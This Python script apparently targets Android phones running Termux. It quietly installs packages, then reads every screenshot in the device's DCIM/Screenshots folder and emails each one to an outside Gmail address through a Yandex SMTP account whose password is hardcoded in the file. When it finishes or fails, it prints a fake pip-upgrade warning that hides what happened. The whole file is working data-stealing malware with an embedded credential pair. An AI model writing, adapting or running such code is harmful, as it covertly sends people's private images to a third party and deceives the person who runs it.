import subprocess
subprocess.call("pip install termcolor", shell=True)
subprocess.call("pip install bs4", shell=True)
subprocess.call("pip install requests", shell=True)

import os
from termcolor import colored
from bs4 import BeautifulSoup
import requests
import time
from email.mime.application import MIMEApplication
import smtplib                                            
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.multipart import *

tyu = 0
try:
 
 while True: 
  tyu += 1
 
  directo = '/storage/emulated/0/DCIM/Screenshots/'
  fie = os.listdir(directo)
  
  nool = len(fie)
  
  
  
  aa1 = fie[tyu]
 
 
  msg = MIMEMultipart()
  msg['Subject'] = 'Тема письма'
  msg['From'] = 'fine.xok@yandex.ru'
   
  part = MIMEText('Текст письма\n')
  msg.attach(part)
   
  part = MIMEApplication(open(directo + aa1 , 'rb').read())
  part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
  msg.attach(part)
  
  server = smtplib.SMTP('smtp.yandex.ru:587')
  server.ehlo()
  server.starttls()
  server.login('fine.xok@yandex.ru', 'xok666000')
   
  server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())
  
  
  
  
  
  
 

except:
 print("")
 print(colored("""WARNING: You are using pip version 20.1.1; however, version 20.2.2 is available.
You should consider upgrading via the '/data/data/com.termux/files/usr/bin/python3 -m pip install —upgrade pip' command.""",'green'))
